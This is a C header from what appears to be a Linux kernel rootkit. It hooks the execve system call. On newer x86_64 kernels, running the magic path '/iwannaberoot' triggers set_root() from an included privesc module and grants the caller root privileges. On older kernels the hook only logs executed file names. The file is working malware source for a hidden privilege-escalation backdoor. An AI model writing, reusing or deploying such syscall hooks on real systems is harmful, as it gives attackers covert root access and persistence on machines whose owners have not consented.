#ifndef EXECVE_HOOK_H
#define EXECVE_HOOK_H

#include <linux/namei.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include "privesc.h"

typedef struct pt_regs sys_regs;

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define NEW_CALL_CONVENTION 1
#endif

#ifdef NEW_CALL_CONVENTION  // after 4,17,0 syscalls use only one argument (struct pt_regs *regs)
#warning "[!] Used new sc convention. Ignore this message"

static asmlinkage long (*sys_execve_target)(const sys_regs *regs);

asmlinkage int sys_execve_hook(const sys_regs *regs)
{
    char __user *filename = (char*) regs->di;
    char executable_name[NAME_MAX] = {0};
    
    // if read something
    if(strncpy_from_user(executable_name, filename, NAME_MAX) > 0)
    {
        // example
        if(strcmp("/iwannaberoot", executable_name) == 0)
            set_root();
    };

    return sys_execve_target(regs);
}

#else

static asmlinkage long (*sys_execve_target)(
    const char __user *filename,
	const char __user *const __user *argv,
	const char __user *const __user *envp
);

asmlinkage int sys_execve_hook(
    const char __user *filename,
	const char __user *const __user *argv,
	const char __user *const __user *envp)
{
    char executable_name[NAME_MAX] = {0};
    
    // if read something
    if(strncpy_from_user(executable_name, filename, NAME_MAX) > 0)
    {
        printk("[chain] somebody wants to execute %s!\n", executable_name);
    }
    return sys_execve_target(filename, argv, envp);
}



#endif
#endif // pragma once